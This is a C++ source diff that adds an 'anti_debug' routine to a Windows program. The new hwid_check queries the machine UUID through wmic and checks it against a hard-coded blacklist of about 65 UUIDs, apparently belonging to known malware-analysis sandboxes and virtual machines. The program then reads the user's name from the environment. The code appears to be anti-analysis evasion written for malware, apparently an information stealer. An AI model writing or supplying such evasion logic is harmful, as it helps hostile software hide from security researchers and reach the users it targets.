@@ -179,11 +179,80 @@ void user_check()
     }
 }
 
+void hwid_check() {
+    try {
+        std::vector<std::string> HWIDS = {"7AB5C494-39F5-4941-9163-47F54D6D5016","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-000000000000","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","79AF5279-16CF-4094-9758-F88A616D81B4","FF577B79-782E-0A4D-8568-B35A9B7EB76B","08C1E400-3C56-11EA-8000-3CECEF43FEDE","6ECEAF72-3548-476C-BD8D-73134A9182C8","49434D53-0200-9036-2500-369025003865","119602E8-92F9-BD4B-8979-DA682276D385","12204D56-28C0-AB03-51B7-44A8B7525250","63FA3342-31C7-4E8E-8089-DAFF6CE5E967","365B4000-3B25-11EA-8000-3CECEF44010C","D8C30328-1B06-4611-8E3C-E433F4F9794E","00000000-0000-0000-0000-50E5493391EF","00000000-0000-0000-0000-AC1F6BD04D98","4CB82042-BA8F-1748-C941-363C391CA7F3","B6464A2B-92C7-4B95-A2D0-E5410081B812","BB233342-2E01-718F-D4A1-E7F69D026428","9921DE3A-5C1A-DF11-9078-563412000026","CC5B3F62-2A04-4D2E-A46C-AA41B7050712","00000000-0000-0000-0000-AC1F6BD04986","C249957A-AA08-4B21-933F-9271BEC63C85","BE784D56-81F5-2C8D-9D4B-5AB56F05D86E","ACA69200-3C4C-11EA-8000-3CECEF4401AA","3F284CA4-8BDF-489B-A273-41B44D668F6D","BB64E044-87BA-C847-BC0A-C797D1A16A50","2E6FB594-9D55-4424-8E74-CE25A25E36B0","42A82042-3F13-512F-5E3D-6BF4FFFD8518","38AB3342-66B0-7175-0B23-F390B3728B78","48941AE9-D52F-11DF-BBDA-503734826431","A7721742-BE24-8A1C-B859-D7F8251A83D3","3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E","D2DC3342-396C-6737-A8F6-0C6673C1DE08","EADD1742-4807-00A0-F92E-CCD933E9D8C1","AF1B2042-4B90-0000-A4E4-632A1C8C7EB1","FE455D1A-BE27-4BA4-96C8-967A6D3A9661","921E2042-70D3-F9F1-8CBD-B398A21F89C6","6AA13342-49AB-DC46-4F28-D7BDDCE6BE32","F68B2042-E3A7-2ADA-ADBC-A6274307A317","07AF2042-392C-229F-8491-455123CC85FB","4EDF3342-E7A2-5776-4AE5-57531F471D56","032E02B4-0499-05C3-0806-3C0700080009"};
+
+        std::string commandLine = "wmic csproduct get uuid";
+
+        STARTUPINFOA si;
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&pi, sizeof(pi));
+
+        // Create the anonymous pipe to capture output
+        HANDLE hChildStdoutRd, hChildStdoutWr;
+        SECURITY_ATTRIBUTES saAttr;
+        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+        saAttr.bInheritHandle = TRUE;
+        saAttr.lpSecurityDescriptor = NULL;
+        if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0)) {
+            throw std::runtime_error("Failed to create anonymous pipe");
+        }
+
+        if (!SetHandleInformation(hChildStdoutRd, HANDLE_FLAG_INHERIT, 0)) {
+            throw std::runtime_error("Failed to set handle information for anonymous pipe");
+        }
+
+        si.hStdOutput = hChildStdoutWr;
+        si.dwFlags |= STARTF_USESTDHANDLES;
+
+        // Launch the wmic process
+        if (!CreateProcessA(NULL, &commandLine[0], NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+            throw std::runtime_error("Failed to create process");
+        }
+
+        WaitForSingleObject(pi.hProcess, INFINITE);
+
+        if (!CloseHandle(hChildStdoutWr)) {
+            throw std::runtime_error("Failed to close handle to anonymous pipe");
+        }
+
+        char buffer[1024];
+        DWORD bytesRead;
+        std::string output;
+        while (ReadFile(hChildStdoutRd, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
+            output.append(buffer, bytesRead);
+        }
+
+        if (!CloseHandle(hChildStdoutRd)) {
+            throw std::runtime_error("Failed to close handle to anonymous pipe");
+        }
+
+        std::string HWID = output.substr(0, output.find_first_of('\r'));
+
+        if (std::find(HWIDS.begin(), HWIDS.end(), HWID) != HWIDS.end()) {
+            throw std::runtime_error("HWID is blacklisted");
+        } else {
+            mdebug("HWID check passed");
+        }
+        
+    } catch (const std::exception& e) {
+        std::cerr << "[ERROR]: " << e.what() << std::endl;
+    }
+}
+
+
+void anti_debug() {
+    user_check();
+    hwid_check();
+}
 
 int main()
 {   
-    // Optional Checks
-    user_check();
+    // Anti Debug Mocde Check
+    anti_debug();
 
 
     std::string username = getenv("USERNAME");
